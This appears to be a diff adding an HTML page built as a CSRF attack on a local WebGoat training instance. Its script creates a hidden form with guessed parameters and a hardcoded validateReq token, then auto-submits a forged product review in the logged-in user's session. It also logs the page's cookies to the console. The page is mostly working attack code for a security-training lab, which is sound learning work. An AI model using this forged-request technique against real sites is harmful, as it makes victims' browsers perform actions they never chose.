@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF POST Review - Fixed</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #333;
+            margin-top: 0;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 15px;
+        }
+        .alert {
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border-left: 5px solid;
+        }
+        .alert-info { background: #e3f2fd; border-color: #2196F3; color: #0d47a1; }
+        .alert-warning { background: #fff3e0; border-color: #ff9800; color: #e65100; }
+        .alert-success { background: #e8f5e9; border-color: #4caf50; color: #1b5e20; }
+        
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 5px;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        .form-group {
+            margin: 20px 0;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: inherit;
+            box-sizing: border-box;
+        }
+        textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        #result {
+            margin-top: 25px;
+            padding: 20px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            display: none;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            background: #e8eaf6;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #5e35b1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 CSRF - Post Review (FIXED)</h1>
+        
+        <div class="alert alert-warning">
+            <strong>⚠️ IMPORTANT:</strong> You MUST be logged into WebGoat at 
+            <code>http://192.168.254.112:8001</code> in THIS SAME BROWSER!
+        </div>
+
+        <div class="alert alert-info">
+            <strong>📝 What This Does:</strong><br>
+            This version tries multiple parameter combinations including validateReq,
+            submit, and other common CSRF parameters that WebGoat might expect.
+        </div>
+
+        <h2>📝 Customize Your Review</h2>
+        <div class="form-group">
+            <label for="stars">Stars (0-5):</label>
+            <input type="number" id="stars" min="0" max="5" value="5">
+        </div>
+        <div class="form-group">
+            <label for="message">Review Message:</label>
+            <textarea id="message">This review was posted via CSRF attack!</textarea>
+        </div>
+
+        <button onclick="attackWithAllParams()" style="font-size: 20px;">🚀 POST REVIEW (All Parameters)</button>
+
+        <div id="result"></div>
+    </div>
+
+    <script>
+        const BASE_URL = 'http://192.168.254.112:8001/WebGoat/csrf/review';
+        
+        function showResult(msg, success = false) {
+            const div = document.getElementById('result');
+            div.style.display = 'block';
+            div.style.background = success ? '#e8f5e9' : '#ffebee';
+            div.style.color = success ? '#1b5e20' : '#b71c1c';
+            div.textContent = msg;
+        }
+
+        function attackWithAllParams() {
+            showResult('🔄 Creating form with all possible parameters...');
+            
+            const stars = document.getElementById('stars').value;
+            const message = document.getElementById('message').value;
+            
+            // Create form
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = BASE_URL;
+            form.target = '_blank';
+            
+            // Parameter combinations that WebGoat might expect
+            const params = [
+                { name: 'stars', value: stars },
+                { name: 'reviewText', value: message },
+                { name: 'review', value: message },
+                { name: 'validateReq', value: '2aa14227b9a13d0bede0388a7fba9aa9' }, // Common CSRF token
+                { name: 'submit', value: 'Submit' },
+                { name: 'Submit', value: 'Submit' },
+                { name: 'action', value: 'submit' }
+            ];
+            
+            // Add all parameters
+            params.forEach(param => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = param.name;
+                input.value = param.value;
+                form.appendChild(input);
+            });
+            
+            // Add to document and submit
+            document.body.appendChild(form);
+            console.log('Submitting form with parameters:', params);
+            form.submit();
+            
+            showResult('✅ Form submitted with all parameters!\n\nParameters sent:\n' + 
+                       params.map(p => `${p.name}: ${p.value}`).join('\n') + 
+                       '\n\nCheck the new window and WebGoat for results.', true);
+            
+            // Clean up
+            setTimeout(() => form.remove(), 2000);
+        }
+
+        // Log for debugging
+        console.log('CSRF Attack Page Loaded');
+        console.log('Target URL:', BASE_URL);
+        console.log('Current cookies:', document.cookie);
+    </script>
+</body>
+</html>
